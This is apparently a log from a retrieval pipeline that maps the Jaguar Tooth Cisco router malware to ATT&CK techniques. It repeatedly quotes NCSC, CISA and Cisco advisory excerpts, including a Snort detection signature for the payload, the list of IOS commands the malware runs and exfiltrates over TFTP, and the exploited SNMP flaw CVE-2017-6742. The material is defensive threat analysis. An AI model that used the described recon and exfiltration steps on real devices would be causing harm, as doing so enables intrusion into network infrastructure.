[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .')]
[2025-04-08 17:38:31,992 INFO] ++ Post-conditions computed for action: Remote System Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-04-08 17:38:36,561 INFO] ++ Indicators computed for action: Remote System Discovery as used by the malware. The indicators are:
['The content contains " | 03   81   60   00   08 | ".', 'The content contains " | 24   02   00   01 | ".']
[2025-04-08 17:38:38,449 INFO] ++ Removed pre-condition: 
A Cisco IOS device with network connectivity.
, due to similarity with: 
The Cisco IOS device is connected to a network.
 (tensor([[0.8583]]))
[2025-04-08 17:39:15,385 INFO] + Processing action: File and Directory Discovery as used by the malware
[2025-04-08 17:39:15,683 INFO] ++ Embedding computed for: File and Directory Discovery as used by the malware. The vector has shape: (384,)
[2025-04-08 17:39:15,806 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery]: tensor([[0.3206]])
[2025-04-08 17:39:15,992 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: local account]: tensor([[0.3251]])
[2025-04-08 17:39:16,128 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.2519]])
[2025-04-08 17:39:16,219 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: email account]: tensor([[0.1976]])
[2025-04-08 17:39:16,385 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.1554]])
[2025-04-08 17:39:16,617 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [application window discovery]: tensor([[0.3637]])
[2025-04-08 17:39:16,762 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [browser information discovery]: tensor([[0.3574]])
[2025-04-08 17:39:16,883 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.2184]])
[2025-04-08 17:39:17,023 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.1376]])
[2025-04-08 17:39:17,185 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud service discovery]: tensor([[0.2097]])
[2025-04-08 17:39:17,262 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3233]])
[2025-04-08 17:39:17,343 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3024]])
[2025-04-08 17:39:17,609 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [debugger evasion]: tensor([[0.3043]])
[2025-04-08 17:39:17,805 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [device driver discovery]: tensor([[0.3976]])
[2025-04-08 17:39:17,973 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [domain trust discovery]: tensor([[0.2158]])
[2025-04-08 17:39:18,134 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [file and directory discovery]: tensor([[0.5614]])
[2025-04-08 17:39:18,290 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [group policy discovery]: tensor([[0.3536]])
[2025-04-08 17:39:18,381 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [log enumeration]: tensor([[0.2843]])
[2025-04-08 17:39:18,607 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network service discovery]: tensor([[0.4009]])
[2025-04-08 17:39:18,781 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network share discovery]: tensor([[0.4795]])
[2025-04-08 17:39:18,972 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [network sniffing]: tensor([[0.2185]])
[2025-04-08 17:39:19,172 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [password policy discovery]: tensor([[0.2385]])
[2025-04-08 17:39:19,281 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.3323]])
[2025-04-08 17:39:19,386 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery]: tensor([[0.3736]])
[2025-04-08 17:39:19,468 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.3951]])
[2025-04-08 17:39:19,556 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3330]])
[2025-04-08 17:39:19,741 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3034]])
[2025-04-08 17:39:19,853 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [process discovery]: tensor([[0.3851]])
[2025-04-08 17:39:20,028 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [query registry]: tensor([[0.3962]])
[2025-04-08 17:39:20,136 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [remote system discovery]: tensor([[0.3243]])
[2025-04-08 17:39:20,235 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [software discovery]: tensor([[0.3464]])
[2025-04-08 17:39:20,375 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.3817]])
[2025-04-08 17:39:20,507 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system information discovery]: tensor([[0.4057]])
[2025-04-08 17:39:20,607 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system location discovery]: tensor([[0.3815]])
[2025-04-08 17:39:20,829 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.4408]])
[2025-04-08 17:39:20,992 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.4071]])
[2025-04-08 17:39:21,213 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.4079]])
[2025-04-08 17:39:21,330 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.4387]])
[2025-04-08 17:39:21,471 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system network connections discovery]: tensor([[0.4094]])
[2025-04-08 17:39:21,647 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.3907]])
[2025-04-08 17:39:21,748 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system service discovery]: tensor([[0.3530]])
[2025-04-08 17:39:21,952 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [system time discovery]: tensor([[0.2211]])
[2025-04-08 17:39:22,138 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.2404]])
[2025-04-08 17:39:22,262 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.2418]])
[2025-04-08 17:39:22,391 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.2496]])
[2025-04-08 17:39:22,547 INFO] ++ Similarity between [File and Directory Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.1775]])
[2025-04-08 17:39:22,555 INFO] ++ Scores: [('file and directory discovery', tensor([[0.5614]])), ('network share discovery', tensor([[0.4795]])), ('system location discovery: system language discovery', tensor([[0.4408]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.4387]])), ('system network connections discovery', tensor([[0.4094]]))]
[2025-04-08 17:39:22,556 INFO] ++ Similar techniques found:
['file and directory discovery', 'network share discovery', 'system location discovery: system language discovery', 'system network configuration discovery: wi-fi discovery', 'system network connections discovery']
[2025-04-08 17:39:22,556 INFO] ++ Querying the QA model for action File and Directory Discovery as used by the malware with the following context:
file and directory discovery
network share discovery
system location discovery: system language discovery
system network configuration discovery: wi-fi discovery
system network connections discovery
[2025-04-08 17:39:23,462 INFO] ++ QA suggested technique: file and directory discovery
[2025-04-08 17:39:23,463 INFO] ++ Selected technique: file and directory discovery
[2025-04-08 17:39:26,964 INFO] ++ Refining the action: File and Directory Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='d11294e9-bea6-4d96-8c79-bee7bd01138d', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.Customers Without Service ContractsCustomers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco TAC:http://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.htmlCustomers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade.Cisco\xa0IOS and IOS\xa0XE SoftwareTo help customers determine their exposure to vulnerabilities in Cisco\xa0IOS and IOS\xa0XE Software, Cisco provides a tool, theCisco\xa0IOS Software Checker, that identifies any Cisco Security Advisories that impact a specific software release and the earliest release that fixes the vulnerabilities described in each advisory (“First Fixed”).'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Contact the Cisco Technical Assistance Center (TAC) to review the file and determine whether the device has been compromised by exploitation of these vulnerabilities.WorkaroundsAdministrators are advised to allow only trusted users to have SNMP access on an affected system.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.')]
[2025-04-08 17:39:45,894 INFO] ++ Pre-conditions computed for action: File and Directory Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.')]
[2025-04-08 17:40:01,126 INFO] ++ Post-conditions computed for action: File and Directory Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 